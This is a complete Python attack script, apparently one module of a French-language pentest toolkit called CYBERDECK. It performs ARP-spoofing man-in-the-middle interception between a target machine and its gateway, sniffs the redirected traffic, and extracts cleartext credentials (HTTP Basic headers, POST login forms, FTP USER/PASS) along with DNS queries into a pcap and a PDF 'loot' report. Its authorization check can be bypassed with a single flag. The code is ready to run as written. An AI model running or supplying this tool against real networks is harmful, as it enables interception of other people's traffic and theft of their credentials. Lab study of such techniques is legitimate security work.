#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CYBERDECK - Module MITM actif (interception + extraction d'identifiants)
Empoisonnement ARP entre une cible et la passerelle, capture du trafic
redirigé, puis extraction des identifiants transitant en clair
(HTTP Basic, formulaires POST, FTP, requêtes DNS).

Refonte offensive de capture_analyse_trames.py : on ne se contente plus
d'observer le clair qui passe, on force le trafic à passer par le deck.

Démontre pourquoi le chiffrement de transport est vital. À n'exécuter que
sur un segment isolé dont vous maîtrisez toutes les machines.
"""
from __future__ import annotations

import os
import sys
import time
import signal
import argparse
import subprocess
from datetime import datetime, timezone

from scapy.all import (
    ARP, Ether, srp, send, sniff, wrpcap,
    IP, TCP, UDP, Raw, DNSQR,
)
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
)

MODULE_VERSION = "1.0 (MITM-Active)"
OBSERVATION_ORIGIN = "Interception active (ARP spoofing + sniff)"

# État global pour restaurer la table ARP proprement à l'arrêt.
_poison_state = {"target_ip": None, "gw_ip": None,
                 "target_mac": None, "gw_mac": None, "running": True}
_credentials = []   # butin : liste de dicts
_dns_queries = []   # domaines résolus par la cible


def enable_ip_forward(enable: bool) -> None:
    """Active/désactive le routage IP du noyau, sinon la cible perd le réseau."""
    val = "1" if enable else "0"
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(val)
    except PermissionError:
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val}"],
                       stdout=subprocess.DEVNULL)


def get_mac(ip: str, iface: str) -> str | None:
    """Résout la MAC d'une IP via une requête ARP ciblée."""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=3, iface=iface, verbose=False)
    for _, rcv in ans:
        return rcv.hwsrc
    return None


def poison(target_ip, target_mac, source_ip):
    """Dit à la cible que source_ip (la passerelle) est à NOTRE MAC."""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip),
         verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac):
    """Rétablit la vraie correspondance IP/MAC dans la table de la cible."""
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=source_ip, hwsrc=source_mac, count=5), verbose=False)


def confirm_authorization(target_ip: str, gw_ip: str) -> None:
    print("=" * 60)
    print(" CONFIRMATION D'AUTORISATION REQUISE")
    print("=" * 60)
    print(f"Cible      : {target_ip}")
    print(f"Passerelle : {gw_ip}")
    print(
        "\nLe MITM coupe et détourne le trafic d'une machine tierce. Il ne doit "
        "viser qu'un hôte d'un labo isolé dont vous êtes propriétaire ou mandaté."
    )
    confirmation = input("\nResaisissez l'IP de la cible pour confirmer : ").strip()
    if confirmation != target_ip:
        print("[!] Confirmation invalide. Arrêt.", file=sys.stderr)
        sys.exit(1)


def extract_credentials(pkt) -> None:
    """Inspecte chaque paquet et récupère les identifiants en clair."""
    # DNS : ce que la cible cherche à joindre
    if pkt.haslayer(DNSQR):
        try:
            qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            if qname and qname not in _dns_queries:
                _dns_queries.append(qname)
        except Exception:
            pass

    if not pkt.haslayer(Raw):
        return
    try:
        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
    except Exception:
        return

    src = pkt[IP].src if pkt.haslayer(IP) else "?"
    dport = pkt[TCP].dport if pkt.haslayer(TCP) else (
        pkt[UDP].dport if pkt.haslayer(UDP) else None)

    low = payload.lower()

    # HTTP Basic Auth
    if "authorization: basic" in low:
        for line in payload.split("\r\n"):
            if line.lower().startswith("authorization: basic"):
                _credentials.append({
                    "type": "HTTP Basic", "src": src, "dport": dport,
                    "data": line.split(" ", 2)[-1].strip()[:60],
                })

    # Formulaires POST : champs user/pass courants
    if "post " in low and ("pass" in low or "pwd" in low or "login" in low):
        snippet = payload.replace("\r\n", " ")[-120:]
        _credentials.append({
            "type": "POST form", "src": src, "dport": dport,
            "data": snippet,
        })

    # FTP en clair
    if dport == 21 and (low.startswith("user ") or low.startswith("pass ")):
        _credentials.append({
            "type": "FTP", "src": src, "dport": dport,
            "data": payload.strip()[:60],
        })


def generate_pdf_report(pcap_file, target_ip, gw_ip) -> str:
    session = os.getenv("CYBERDECK_SESSION_ID", "N/A")
    operator = os.getenv("CYBERDECK_OPERATOR", "Inconnu")
    scenario = os.getenv("CYBERDECK_SCENARIO", "N/A")
    interface = os.getenv("CYBERDECK_INTERFACE", "N/A")
    timestamp_utc = os.getenv("CYBERDECK_UTC_TIME", "Inconnu")
    file_time = os.getenv("CYBERDECK_FILE_TIME",
                          datetime.now().strftime("%Y%m%d_%H%M%S"))
    run_ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    output_path = f"mitm_butin_{session}_{file_time}.pdf"
    doc = SimpleDocTemplate(output_path, pagesize=letter)
    styles = getSampleStyleSheet()
    elements = []

    elements.append(Paragraph("MITM actif - Butin d'interception", styles["Title"]))
    elements.append(Spacer(1, 8))
    elements.append(Paragraph(f"<b>Session / Scénario :</b> {session} / {scenario}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Opérateur :</b> {operator}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Cible / Passerelle :</b> {target_ip} / {gw_ip}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Interface :</b> {interface} | <b>Version :</b> {MODULE_VERSION}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Horodatage session (UTC) :</b> {timestamp_utc}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Horodatage du test (UTC) :</b> {run_ts}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Origine :</b> {OBSERVATION_ORIGIN} (pcap : {pcap_file})", styles["Normal"]))
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("Identifiants capturés en clair :", styles["Heading2"]))
    if not _credentials:
        elements.append(Paragraph(
            "Aucun identifiant en clair intercepté. Le trafic était probablement "
            "chiffré (HTTPS/TLS), ce qui est le comportement attendu et sûr.",
            styles["Normal"]))
    else:
        rows = [["Type", "Source", "Port", "Donnée (tronquée)"]]
        for c in _credentials:
            rows.append([c["type"], c["src"], str(c["dport"]), c["data"][:50]])
        t = Table(rows, colWidths=[80, 90, 40, 250])
        t.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, 0), colors.darkred),
            ("TEXTCOLOR", (0, 0), (-1, 0), colors.whitesmoke),
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
            ("GRID", (0, 0), (-1, -1), 0.5, colors.black),
            ("FONTSIZE", (0, 0), (-1, -1), 7),
        ]))
        elements.append(t)

    elements.append(Spacer(1, 15))
    elements.append(Paragraph("Domaines résolus par la cible (DNS) :", styles["Heading2"]))
    if not _dns_queries:
        elements.append(Paragraph("Aucune requête DNS en clair observée.", styles["Normal"]))
    else:
        for q in _dns_queries[:40]:
            elements.append(Paragraph(f"- {q}", styles["Normal"]))

    elements.append(Spacer(1, 15))
    elements.append(Paragraph("Limites (Méthodologie) :", styles["Heading2"]))
    elements.append(Paragraph(
        "Seul le trafic non chiffré est exploitable. HTTPS, SSH, FTPS et le DNS "
        "chiffré (DoH/DoT) restent opaques : l'interception prouve le chemin, "
        "pas l'accès au contenu protégé. L'absence de butin démontre au contraire "
        "l'efficacité du chiffrement de transport.", styles["Normal"]))

    doc.build(elements)
    print(f"[+] Rapport PDF généré : {output_path}")
    return output_path


def stop_handler(signum, frame):
    _poison_state["running"] = False


def main() -> int:
    if os.geteuid() != 0:
        print("[!] Ce module exige root (forge de paquets ARP). "
              "Relancez avec sudo -E.", file=sys.stderr)
        return 1

    parser = argparse.ArgumentParser(description="MITM actif par ARP spoofing.")
    parser.add_argument("-t", "--target", default=os.getenv("CYBERDECK_TARGET", ""),
                        help="IP de la cible. Défaut : CYBERDECK_TARGET.")
    parser.add_argument("-g", "--gateway", required=True, help="IP de la passerelle.")
    parser.add_argument("-i", "--interface", default=os.getenv("CYBERDECK_INTERFACE", "eth0"),
                        help="Interface réseau.")
    parser.add_argument("-d", "--duree", type=int, default=60,
                        help="Durée d'interception en secondes (défaut 60).")
    parser.add_argument("--skip-confirmation", action="store_true")
    args = parser.parse_args()

    target_ip = args.target.strip()
    gw_ip = args.gateway.strip()
    iface = args.interface
    if not target_ip or target_ip in ("LAN", "N/A"):
        target_ip = input("IP de la cible : ").strip()

    if not args.skip_confirmation:
        confirm_authorization(target_ip, gw_ip)

    print(f"[*] Résolution des MAC sur {iface}...")
    target_mac = get_mac(target_ip, iface)
    gw_mac = get_mac(gw_ip, iface)
    if not target_mac or not gw_mac:
        print("[!] Impossible de résoudre la MAC de la cible ou de la passerelle.",
              file=sys.stderr)
        return 1
    print(f"[+] Cible {target_ip} -> {target_mac}")
    print(f"[+] Passerelle {gw_ip} -> {gw_mac}")

    _poison_state.update(target_ip=target_ip, gw_ip=gw_ip,
                         target_mac=target_mac, gw_mac=gw_mac)

    enable_ip_forward(True)
    signal.signal(signal.SIGINT, stop_handler)

    session = os.getenv("CYBERDECK_SESSION_ID", "local")
    file_time = os.getenv("CYBERDECK_FILE_TIME", datetime.now().strftime("%Y%m%d_%H%M%S"))
    pcap_file = f"mitm_{session}_{file_time}.pcapng"

    print(f"[*] Empoisonnement ARP + capture ({args.duree}s). Ctrl+C pour arrêter.")
    captured = []

    def on_packet(pkt):
        captured.append(pkt)
        extract_credentials(pkt)

    # Boucle : on ré-empoisonne régulièrement pendant qu'on sniffe par salves.
    end = time.time() + args.duree
    bpf = f"host {target_ip}"
    try:
        while _poison_state["running"] and time.time() < end:
            poison(target_ip, target_mac, gw_ip)   # cible croit être face à la GW
            poison(gw_ip, gw_mac, target_ip)        # GW croit être face à la cible
            sniff(iface=iface, prn=on_packet, timeout=5,
                  filter=bpf, store=False)
    finally:
        print("\n[*] Restauration de la table ARP...")
        restore(target_ip, target_mac, gw_ip, gw_mac)
        restore(gw_ip, gw_mac, target_ip, target_mac)
        enable_ip_forward(False)

    if captured:
        wrpcap(pcap_file, captured)
        print(f"[+] Capture enregistrée : {pcap_file} ({len(captured)} paquets)")

    print(f"[+] {len(_credentials)} identifiant(s) en clair, "
          f"{len(_dns_queries)} domaine(s) DNS.")
    generate_pdf_report(pcap_file, target_ip, gw_ip)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
